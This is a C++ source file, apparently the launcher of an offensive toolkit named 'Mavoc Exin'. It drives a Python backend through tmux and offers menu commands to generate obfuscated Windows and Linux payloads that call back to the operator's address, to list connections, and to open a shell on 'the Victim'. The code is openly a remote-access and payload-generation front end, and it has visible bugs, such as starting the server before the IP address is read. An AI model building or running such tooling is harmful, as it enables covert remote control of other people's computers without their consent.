#include <iostream>
#include <string>
#include <fstream>
#include <stdlib.h>
#include <regex>
#include <iostream>
#include <string>
#include <fstream>
#include <cstdlib>
#include <regex>


#define RESET "\033[0m"
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define BLUE "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN "\033[36m"

using namespace std;


void psw_server(string& power_ip_addr){
    system(power_ip_addr.c_str());
}



int main(){
    string local_ip_address;
    string banner;
    string tmux_sr1;
    string tmux_sr2;
    cout << "Starting Python Exin" << endl;
    system("clear");
    banner = R"(
┳┳┓         ┏┓  •  
┃┃┃┏┓┓┏┏┓┏  ┣ ┓┏┓┏┓
┛ ┗┗┻┗┛┗┛┗  ┗┛┛┗┗┛┗
    )";

    cout << banner;
    cout << endl;

    // Fetch ip from ip_addr
    cout << YELLOW << "Starting psw-Bible Server" << RESET << endl;
    string power_ip_addr = "python3 server.py " + local_ip_address + " > /dev/null 2>&1 &";
    psw_server(power_ip_addr);
    cout << GREEN << "Psw Server Running" << RESET << endl;

    ifstream infile("ip_addr");
    
    if(!infile.is_open()) {
        cerr << "Fail to Fetch the IP Address . Enter manually :";
        cin >> local_ip_address;
    }

    string stored_ip_address;
    getline(infile, stored_ip_address);

    infile.close();
    
    local_ip_address = stored_ip_address;

    // 
    //cout << "Enter Local Ip Address: ";
    //cin >> local_ip_address;

    tmux_sr1 = "gnome-terminal -- bash -c 'tmux new-session -s mavoc-shell'";
    tmux_sr2 = "tmux send-keys -t mavoc-shell 'source bin/python-exin/mavoc/bin/activate ; python3 bin/python-exin/mavoc-exin.py ; clear' C-m";
    system(tmux_sr1.c_str());
    system("bash files/loading");
    system(tmux_sr2.c_str());

    while (true){
        string cmd;
        cout << "Mavoc Ex-py > ";
        getline(cin, cmd);

        cmd = regex_replace(cmd, regex("\\s+$"), "");
       
    
    if (cmd.empty()){
        continue;
    }

    else if (cmd == "clear"){
        system("clear");
    }

    else if (cmd == "help"){
        system("cat files/infos/help_exin");
    }
    else if (cmd == "generate windows payload"){
    string tmux_sr3 = "tmux send-keys -t mavoc-shell 'generate os=windows lhost="+ local_ip_address +" obfuscate' C-m";
    system(tmux_sr3.c_str());
    }
    
    else if (cmd == "list connections"){
        string sr6 = "tmux send-keys -t mavoc-shell 'sessions' C-m ";
        cout << "To Connect to the Victim . Enter shell `your Session ID` " << endl;
    }
    
    else if (cmd == "generate linux payload"){
        string tmux_sr4 = "tmux send-keys -t mavoc-shell 'generate os=linux lhost="+ local_ip_address +" ' C-m";
        system(tmux_sr4.c_str());
    }

    else if (cmd == "help exin"){
        string tmux_sr5 = "tmux send-keys -t mavoc-shell 'help' C-m";
        system(tmux_sr5.c_str());
    }

    else if (cmd == "powershell bible"){
        system("./psw-bible");
    }
    else if (cmd == "exit"){
        system("pkill tmux");
        system("/usr/bin/bash ; ser_if=$(pgrep -f server.py); kill $ser_if &");

        break;
    }

    else {
        cout << "\033[0;33mCommand Not Found . Type help command for more info\033[0m";
    }
}
}